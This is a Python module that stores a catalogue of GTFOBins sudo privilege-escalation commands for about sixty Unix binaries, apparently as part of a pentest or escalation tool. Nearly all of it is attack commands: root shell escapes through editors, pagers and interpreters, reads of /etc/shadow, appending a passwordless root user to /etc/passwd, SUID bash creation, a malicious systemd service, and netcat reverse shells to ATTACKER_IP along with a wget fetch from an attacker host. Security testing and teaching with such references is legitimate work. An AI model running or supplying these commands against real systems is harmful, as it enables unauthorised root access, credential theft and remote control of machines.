"""
GTFOBins Sudo Database
======================

Comprehensive database of GTFOBins sudo exploitation techniques.

Reference: https://gtfobins.github.io/
"""

from dataclasses import dataclass, field
from typing import List, Dict, Optional
from enum import Enum


class SudoExploitType(Enum):
    """Type of sudo exploitation technique"""
    SHELL = "shell"  # Spawns interactive shell
    COMMAND = "command"  # Executes arbitrary command
    FILE_READ = "file_read"  # Reads arbitrary files
    FILE_WRITE = "file_write"  # Writes arbitrary files
    SUID_CREATE = "suid_create"  # Creates SUID binary


@dataclass
class SudoTechnique:
    """
    Single sudo exploitation technique.

    Attributes:
        command: The exploit command
        exploit_type: Type of exploitation
        description: Human-readable description
        interactive: Requires interactive terminal
        test_command: Non-interactive test version
        env_required: Required environment setup
    """
    command: str
    exploit_type: SudoExploitType
    description: str
    interactive: bool = False
    test_command: Optional[str] = None
    env_required: Optional[str] = None


@dataclass
class BinarySudoExploits:
    """
    All sudo exploitation techniques for a specific binary.
    """
    name: str
    techniques: List[SudoTechnique]
    notes: str = ""
    url: str = field(default="")

    def __post_init__(self):
        if not self.url:
            self.url = f"https://gtfobins.github.io/gtfobins/{self.name}/#sudo"


class GTFOBinsSudo:
    """
    GTFOBins sudo exploitation database.

    Contains sudo exploitation techniques for known binaries.
    """

    def __init__(self):
        self._db: Dict[str, BinarySudoExploits] = {}
        self._load_database()

    def _load_database(self) -> None:
        """Load all GTFOBins sudo exploits"""

        # ═══════════════════════════════════════════════════════════
        # SHELLS
        # ═══════════════════════════════════════════════════════════

        self._add_binary(BinarySudoExploits(
            name="bash",
            techniques=[
                SudoTechnique(
                    command="sudo bash",
                    exploit_type=SudoExploitType.SHELL,
                    description="Direct bash shell as root",
                    interactive=True,
                    test_command="sudo bash -c 'id'"
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="sh",
            techniques=[
                SudoTechnique(
                    command="sudo sh",
                    exploit_type=SudoExploitType.SHELL,
                    description="Direct sh shell as root",
                    interactive=True,
                    test_command="sudo sh -c 'id'"
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="dash",
            techniques=[
                SudoTechnique(
                    command="sudo dash",
                    exploit_type=SudoExploitType.SHELL,
                    description="Direct dash shell as root",
                    interactive=True,
                    test_command="sudo dash -c 'id'"
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="zsh",
            techniques=[
                SudoTechnique(
                    command="sudo zsh",
                    exploit_type=SudoExploitType.SHELL,
                    description="Direct zsh shell as root",
                    interactive=True,
                    test_command="sudo zsh -c 'id'"
                )
            ]
        ))

        # ═══════════════════════════════════════════════════════════
        # SCRIPTING LANGUAGES
        # ═══════════════════════════════════════════════════════════

        self._add_binary(BinarySudoExploits(
            name="python",
            techniques=[
                SudoTechnique(
                    command="sudo python -c 'import os; os.system(\"/bin/sh\")'",
                    exploit_type=SudoExploitType.SHELL,
                    description="Spawn shell via os.system",
                    interactive=True,
                    test_command="sudo python -c 'import os; os.system(\"id\")'"
                ),
                SudoTechnique(
                    command="sudo python -c 'import pty; pty.spawn(\"/bin/sh\")'",
                    exploit_type=SudoExploitType.SHELL,
                    description="Spawn PTY shell",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="python3",
            techniques=[
                SudoTechnique(
                    command="sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
                    exploit_type=SudoExploitType.SHELL,
                    description="Spawn shell via os.system",
                    interactive=True,
                    test_command="sudo python3 -c 'import os; os.system(\"id\")'"
                ),
                SudoTechnique(
                    command="sudo python3 -c 'import pty; pty.spawn(\"/bin/sh\")'",
                    exploit_type=SudoExploitType.SHELL,
                    description="Spawn PTY shell",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="perl",
            techniques=[
                SudoTechnique(
                    command="sudo perl -e 'exec \"/bin/sh\";'",
                    exploit_type=SudoExploitType.SHELL,
                    description="Exec shell directly",
                    interactive=True,
                    test_command="sudo perl -e 'exec \"id\";'"
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="ruby",
            techniques=[
                SudoTechnique(
                    command="sudo ruby -e 'exec \"/bin/sh\"'",
                    exploit_type=SudoExploitType.SHELL,
                    description="Exec shell directly",
                    interactive=True,
                    test_command="sudo ruby -e 'exec \"id\"'"
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="php",
            techniques=[
                SudoTechnique(
                    command="sudo php -r \"system('/bin/sh');\"",
                    exploit_type=SudoExploitType.SHELL,
                    description="System call to shell",
                    interactive=True,
                    test_command="sudo php -r \"system('id');\""
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="lua",
            techniques=[
                SudoTechnique(
                    command="sudo lua -e 'os.execute(\"/bin/sh\")'",
                    exploit_type=SudoExploitType.SHELL,
                    description="Execute shell via os.execute",
                    interactive=True,
                    test_command="sudo lua -e 'os.execute(\"id\")'"
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="node",
            techniques=[
                SudoTechnique(
                    command="sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'",
                    exploit_type=SudoExploitType.SHELL,
                    description="Spawn shell via child_process",
                    interactive=True
                )
            ]
        ))

        # ═══════════════════════════════════════════════════════════
        # TEXT EDITORS
        # ═══════════════════════════════════════════════════════════

        self._add_binary(BinarySudoExploits(
            name="vim",
            techniques=[
                SudoTechnique(
                    command="sudo vim -c ':!/bin/sh'",
                    exploit_type=SudoExploitType.SHELL,
                    description="Shell escape from vim",
                    interactive=True
                ),
                SudoTechnique(
                    command="sudo vim -c ':set shell=/bin/sh' -c ':shell'",
                    exploit_type=SudoExploitType.SHELL,
                    description="Set shell and execute",
                    interactive=True
                ),
                SudoTechnique(
                    command="sudo vim -c ':py3 import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
                    exploit_type=SudoExploitType.SHELL,
                    description="Python3 execution in vim",
                    interactive=True
                )
            ],
            notes="Multiple escape methods available"
        ))

        self._add_binary(BinarySudoExploits(
            name="vi",
            techniques=[
                SudoTechnique(
                    command="sudo vi -c ':!/bin/sh' /dev/null",
                    exploit_type=SudoExploitType.SHELL,
                    description="Shell escape from vi",
                    interactive=True
                ),
                SudoTechnique(
                    command="sudo vi -c ':set shell=/bin/sh' -c ':shell'",
                    exploit_type=SudoExploitType.SHELL,
                    description="Set shell and execute",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="nano",
            techniques=[
                SudoTechnique(
                    command="sudo nano\n^R^X\nreset; sh 1>&0 2>&0",
                    exploit_type=SudoExploitType.SHELL,
                    description="Ctrl+R, Ctrl+X to execute",
                    interactive=True
                )
            ],
            notes="Press Ctrl+R then Ctrl+X in nano"
        ))

        self._add_binary(BinarySudoExploits(
            name="emacs",
            techniques=[
                SudoTechnique(
                    command="sudo emacs -Q -nw --eval '(term \"/bin/sh\")'",
                    exploit_type=SudoExploitType.SHELL,
                    description="Spawn terminal in emacs",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="ed",
            techniques=[
                SudoTechnique(
                    command="sudo ed\n!/bin/sh",
                    exploit_type=SudoExploitType.SHELL,
                    description="Shell escape from ed",
                    interactive=True
                )
            ]
        ))

        # ═══════════════════════════════════════════════════════════
        # FILE VIEWERS / PAGERS
        # ═══════════════════════════════════════════════════════════

        self._add_binary(BinarySudoExploits(
            name="less",
            techniques=[
                SudoTechnique(
                    command="sudo less /etc/passwd\n!/bin/sh",
                    exploit_type=SudoExploitType.SHELL,
                    description="Shell escape from less",
                    interactive=True
                )
            ],
            notes="Type !sh while viewing a file"
        ))

        self._add_binary(BinarySudoExploits(
            name="more",
            techniques=[
                SudoTechnique(
                    command="sudo more /etc/passwd\n!/bin/sh",
                    exploit_type=SudoExploitType.SHELL,
                    description="Shell escape from more",
                    interactive=True
                )
            ],
            notes="Type !sh while viewing a file"
        ))

        self._add_binary(BinarySudoExploits(
            name="man",
            techniques=[
                SudoTechnique(
                    command="sudo man man\n!/bin/sh",
                    exploit_type=SudoExploitType.SHELL,
                    description="Shell escape from man",
                    interactive=True
                )
            ]
        ))

        # ═══════════════════════════════════════════════════════════
        # FILE UTILITIES
        # ═══════════════════════════════════════════════════════════

        self._add_binary(BinarySudoExploits(
            name="find",
            techniques=[
                SudoTechnique(
                    command="sudo find . -exec /bin/sh \\; -quit",
                    exploit_type=SudoExploitType.SHELL,
                    description="Execute shell via -exec",
                    interactive=True,
                    test_command="sudo find . -exec id \\; -quit"
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="cp",
            techniques=[
                SudoTechnique(
                    command="sudo cp /bin/bash /tmp/rootbash && sudo chmod +s /tmp/rootbash && /tmp/rootbash -p",
                    exploit_type=SudoExploitType.SUID_CREATE,
                    description="Create SUID bash copy"
                ),
                SudoTechnique(
                    command="LFILE=/etc/shadow\nsudo cp \"$LFILE\" /tmp/shadow_copy",
                    exploit_type=SudoExploitType.FILE_READ,
                    description="Copy sensitive files"
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="mv",
            techniques=[
                SudoTechnique(
                    command="LFILE=/etc/shadow\nsudo mv \"$LFILE\" /tmp/shadow_copy",
                    exploit_type=SudoExploitType.FILE_READ,
                    description="Move sensitive files"
                )
            ],
            notes="Careful - this moves the original file!"
        ))

        self._add_binary(BinarySudoExploits(
            name="cat",
            techniques=[
                SudoTechnique(
                    command="sudo cat /etc/shadow",
                    exploit_type=SudoExploitType.FILE_READ,
                    description="Read sensitive files",
                    test_command="sudo cat /etc/shadow"
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="head",
            techniques=[
                SudoTechnique(
                    command="sudo head -c 10000 /etc/shadow",
                    exploit_type=SudoExploitType.FILE_READ,
                    description="Read files with head"
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="tail",
            techniques=[
                SudoTechnique(
                    command="sudo tail -c 10000 /etc/shadow",
                    exploit_type=SudoExploitType.FILE_READ,
                    description="Read files with tail"
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="dd",
            techniques=[
                SudoTechnique(
                    command="sudo dd if=/etc/shadow",
                    exploit_type=SudoExploitType.FILE_READ,
                    description="Read files with dd"
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="tee",
            techniques=[
                SudoTechnique(
                    command="echo 'hacker::0:0::/root:/bin/bash' | sudo tee -a /etc/passwd",
                    exploit_type=SudoExploitType.FILE_WRITE,
                    description="Append to files"
                )
            ],
            notes="Can append to /etc/passwd to add root user"
        ))

        # ═══════════════════════════════════════════════════════════
        # TEXT PROCESSING
        # ═══════════════════════════════════════════════════════════

        self._add_binary(BinarySudoExploits(
            name="awk",
            techniques=[
                SudoTechnique(
                    command="sudo awk 'BEGIN {system(\"/bin/sh\")}'",
                    exploit_type=SudoExploitType.SHELL,
                    description="System call from awk",
                    interactive=True,
                    test_command="sudo awk 'BEGIN {system(\"id\")}'"
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="gawk",
            techniques=[
                SudoTechnique(
                    command="sudo gawk 'BEGIN {system(\"/bin/sh\")}'",
                    exploit_type=SudoExploitType.SHELL,
                    description="System call from gawk",
                    interactive=True,
                    test_command="sudo gawk 'BEGIN {system(\"id\")}'"
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="sed",
            techniques=[
                SudoTechnique(
                    command="sudo sed -n '1e exec sh 1>&0' /etc/hosts",
                    exploit_type=SudoExploitType.SHELL,
                    description="Execute via sed -e",
                    interactive=True
                )
            ]
        ))

        # ═══════════════════════════════════════════════════════════
        # NETWORK TOOLS
        # ═══════════════════════════════════════════════════════════

        self._add_binary(BinarySudoExploits(
            name="nmap",
            techniques=[
                SudoTechnique(
                    command="TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nsudo nmap --script=$TF",
                    exploit_type=SudoExploitType.SHELL,
                    description="Execute Lua script",
                    interactive=True,
                    env_required="TF=$(mktemp); echo 'os.execute(\"/bin/sh\")' > $TF"
                ),
                SudoTechnique(
                    command="sudo nmap --interactive\n!sh",
                    exploit_type=SudoExploitType.SHELL,
                    description="Interactive mode (old versions)",
                    interactive=True
                )
            ],
            notes="--interactive removed in newer nmap versions"
        ))

        self._add_binary(BinarySudoExploits(
            name="socat",
            techniques=[
                SudoTechnique(
                    command="sudo socat stdin exec:/bin/sh",
                    exploit_type=SudoExploitType.SHELL,
                    description="Exec shell via socat",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="wget",
            techniques=[
                SudoTechnique(
                    command="TF=$(mktemp)\nchmod +x $TF\necho -e '#!/bin/sh\\n/bin/sh' > $TF\nsudo wget --use-askpass=$TF 0",
                    exploit_type=SudoExploitType.SHELL,
                    description="Use askpass for shell",
                    interactive=True
                ),
                SudoTechnique(
                    command="sudo wget -O /tmp/shadow http://attacker/shadow_replacement",
                    exploit_type=SudoExploitType.FILE_WRITE,
                    description="Download and overwrite files"
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="curl",
            techniques=[
                SudoTechnique(
                    command="sudo curl file:///etc/shadow",
                    exploit_type=SudoExploitType.FILE_READ,
                    description="Read local files via file://"
                ),
                SudoTechnique(
                    command="sudo curl -o /tmp/shadow file:///etc/shadow",
                    exploit_type=SudoExploitType.FILE_READ,
                    description="Copy files via curl"
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="ftp",
            techniques=[
                SudoTechnique(
                    command="sudo ftp\n!/bin/sh",
                    exploit_type=SudoExploitType.SHELL,
                    description="Shell escape from ftp",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="ssh",
            techniques=[
                SudoTechnique(
                    command="sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x",
                    exploit_type=SudoExploitType.SHELL,
                    description="Shell via ProxyCommand",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="nc",
            techniques=[
                SudoTechnique(
                    command="sudo nc -e /bin/sh ATTACKER_IP 4444",
                    exploit_type=SudoExploitType.SHELL,
                    description="Reverse shell via nc -e"
                )
            ],
            notes="Requires nc with -e option"
        ))

        self._add_binary(BinarySudoExploits(
            name="netcat",
            techniques=[
                SudoTechnique(
                    command="sudo netcat -e /bin/sh ATTACKER_IP 4444",
                    exploit_type=SudoExploitType.SHELL,
                    description="Reverse shell via netcat"
                )
            ]
        ))

        # ═══════════════════════════════════════════════════════════
        # ARCHIVE UTILITIES
        # ═══════════════════════════════════════════════════════════

        self._add_binary(BinarySudoExploits(
            name="tar",
            techniques=[
                SudoTechnique(
                    command="sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
                    exploit_type=SudoExploitType.SHELL,
                    description="Checkpoint action execution",
                    interactive=True,
                    test_command="sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=id"
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="zip",
            techniques=[
                SudoTechnique(
                    command="TF=$(mktemp -u)\nsudo zip $TF /etc/hosts -T -TT 'sh #'",
                    exploit_type=SudoExploitType.SHELL,
                    description="Test function with shell",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="unzip",
            techniques=[
                SudoTechnique(
                    command="sudo unzip -K archive.zip",
                    exploit_type=SudoExploitType.FILE_WRITE,
                    description="Extract with preserved permissions"
                )
            ],
            notes="Can extract SUID binaries"
        ))

        self._add_binary(BinarySudoExploits(
            name="gzip",
            techniques=[
                SudoTechnique(
                    command="sudo gzip -f /etc/shadow -t",
                    exploit_type=SudoExploitType.FILE_READ,
                    description="Read via test mode"
                )
            ]
        ))

        # ═══════════════════════════════════════════════════════════
        # VERSION CONTROL
        # ═══════════════════════════════════════════════════════════

        self._add_binary(BinarySudoExploits(
            name="git",
            techniques=[
                SudoTechnique(
                    command="sudo git -p help\n!/bin/sh",
                    exploit_type=SudoExploitType.SHELL,
                    description="Shell escape from git pager",
                    interactive=True
                ),
                SudoTechnique(
                    command="sudo PAGER='sh -c \"exec sh 0<&1\"' git -p help",
                    exploit_type=SudoExploitType.SHELL,
                    description="Custom pager exploitation",
                    interactive=True
                )
            ]
        ))

        # ═══════════════════════════════════════════════════════════
        # SYSTEM UTILITIES
        # ═══════════════════════════════════════════════════════════

        self._add_binary(BinarySudoExploits(
            name="env",
            techniques=[
                SudoTechnique(
                    command="sudo env /bin/sh",
                    exploit_type=SudoExploitType.SHELL,
                    description="Spawn shell via env",
                    interactive=True,
                    test_command="sudo env id"
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="systemctl",
            techniques=[
                SudoTechnique(
                    command="TF=$(mktemp).service\necho '[Service]' > $TF\necho 'Type=oneshot' >> $TF\necho 'ExecStart=/bin/sh -c \"chmod +s /bin/bash\"' >> $TF\necho '[Install]' >> $TF\necho 'WantedBy=multi-user.target' >> $TF\nsudo systemctl link $TF\nsudo systemctl enable --now $(basename $TF)",
                    exploit_type=SudoExploitType.SUID_CREATE,
                    description="Create malicious service",
                    env_required="Service file creation"
                ),
                SudoTechnique(
                    command="sudo systemctl\n!sh",
                    exploit_type=SudoExploitType.SHELL,
                    description="Shell escape from systemctl pager",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="journalctl",
            techniques=[
                SudoTechnique(
                    command="sudo journalctl\n!/bin/sh",
                    exploit_type=SudoExploitType.SHELL,
                    description="Shell escape from journalctl",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="mount",
            techniques=[
                SudoTechnique(
                    command="sudo mount -o bind /bin/sh /bin/mount\nsudo mount",
                    exploit_type=SudoExploitType.SHELL,
                    description="Bind mount shell over mount binary",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="docker",
            techniques=[
                SudoTechnique(
                    command="sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
                    exploit_type=SudoExploitType.SHELL,
                    description="Mount host filesystem in container",
                    interactive=True
                )
            ],
            notes="Full root access to host"
        ))

        self._add_binary(BinarySudoExploits(
            name="service",
            techniques=[
                SudoTechnique(
                    command="sudo service ../../bin/sh",
                    exploit_type=SudoExploitType.SHELL,
                    description="Path traversal to shell",
                    interactive=True
                )
            ]
        ))

        # ═══════════════════════════════════════════════════════════
        # MISC UTILITIES
        # ═══════════════════════════════════════════════════════════

        self._add_binary(BinarySudoExploits(
            name="xargs",
            techniques=[
                SudoTechnique(
                    command="sudo xargs -a /dev/null sh",
                    exploit_type=SudoExploitType.SHELL,
                    description="Spawn shell via xargs",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="time",
            techniques=[
                SudoTechnique(
                    command="sudo time /bin/sh",
                    exploit_type=SudoExploitType.SHELL,
                    description="Spawn shell via time",
                    interactive=True,
                    test_command="sudo time id"
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="timeout",
            techniques=[
                SudoTechnique(
                    command="sudo timeout 7d /bin/sh",
                    exploit_type=SudoExploitType.SHELL,
                    description="Spawn shell via timeout",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="strace",
            techniques=[
                SudoTechnique(
                    command="sudo strace -o /dev/null /bin/sh",
                    exploit_type=SudoExploitType.SHELL,
                    description="Spawn shell via strace",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="gdb",
            techniques=[
                SudoTechnique(
                    command="sudo gdb -nx -ex '!sh' -ex quit",
                    exploit_type=SudoExploitType.SHELL,
                    description="Shell escape from gdb",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="screen",
            techniques=[
                SudoTechnique(
                    command="sudo screen",
                    exploit_type=SudoExploitType.SHELL,
                    description="Screen spawns shell as root",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="tmux",
            techniques=[
                SudoTechnique(
                    command="sudo tmux",
                    exploit_type=SudoExploitType.SHELL,
                    description="Tmux spawns shell as root",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="expect",
            techniques=[
                SudoTechnique(
                    command="sudo expect -c 'spawn /bin/sh; interact'",
                    exploit_type=SudoExploitType.SHELL,
                    description="Spawn shell via expect",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="script",
            techniques=[
                SudoTechnique(
                    command="sudo script -q /dev/null",
                    exploit_type=SudoExploitType.SHELL,
                    description="Spawn shell via script",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="make",
            techniques=[
                SudoTechnique(
                    command="COMMAND='/bin/sh'\nsudo make -s --eval=$'x:\\n\\t-'\"$COMMAND\"",
                    exploit_type=SudoExploitType.SHELL,
                    description="Execute via make eval",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="nice",
            techniques=[
                SudoTechnique(
                    command="sudo nice /bin/sh",
                    exploit_type=SudoExploitType.SHELL,
                    description="Spawn shell via nice",
                    interactive=True,
                    test_command="sudo nice id"
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="rvim",
            techniques=[
                SudoTechnique(
                    command="sudo rvim -c ':py3 import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
                    exploit_type=SudoExploitType.SHELL,
                    description="Python escape from rvim",
                    interactive=True
                )
            ],
            notes="Restricted vim can still be escaped"
        ))

        self._add_binary(BinarySudoExploits(
            name="rsync",
            techniques=[
                SudoTechnique(
                    command="sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null",
                    exploit_type=SudoExploitType.SHELL,
                    description="Shell via rsync -e",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="pip",
            techniques=[
                SudoTechnique(
                    command="TF=$(mktemp -d)\necho 'import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"sh <$(tty) >$(tty) 2>$(tty)\")' > $TF/setup.py\nsudo pip install $TF",
                    exploit_type=SudoExploitType.SHELL,
                    description="Shell via malicious package",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinarySudoExploits(
            name="pip3",
            techniques=[
                SudoTechnique(
                    command="TF=$(mktemp -d)\necho 'import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"sh <$(tty) >$(tty) 2>$(tty)\")' > $TF/setup.py\nsudo pip3 install $TF",
                    exploit_type=SudoExploitType.SHELL,
                    description="Shell via malicious package",
                    interactive=True
                )
            ]
        ))

        # Special: ALL permission
        self._add_binary(BinarySudoExploits(
            name="ALL",
            techniques=[
                SudoTechnique(
                    command="sudo su -",
                    exploit_type=SudoExploitType.SHELL,
                    description="Full sudo access - just su to root",
                    interactive=True,
                    test_command="sudo id"
                ),
                SudoTechnique(
                    command="sudo /bin/bash",
                    exploit_type=SudoExploitType.SHELL,
                    description="Direct bash as root",
                    interactive=True
                )
            ],
            notes="Full sudo access - game over!"
        ))

    def _add_binary(self, binary: BinarySudoExploits) -> None:
        """Add binary to database"""
        self._db[binary.name] = binary

    def get(self, name: str) -> Optional[BinarySudoExploits]:
        """Get exploitation techniques for a binary"""
        return self._db.get(name)

    def has(self, name: str) -> bool:
        """Check if binary is in database"""
        return name in self._db

    def all_binaries(self) -> List[str]:
        """Get list of all known binaries"""
        return list(self._db.keys())

    def __len__(self) -> int:
        return len(self._db)

    def __contains__(self, name: str) -> bool:
        return name in self._db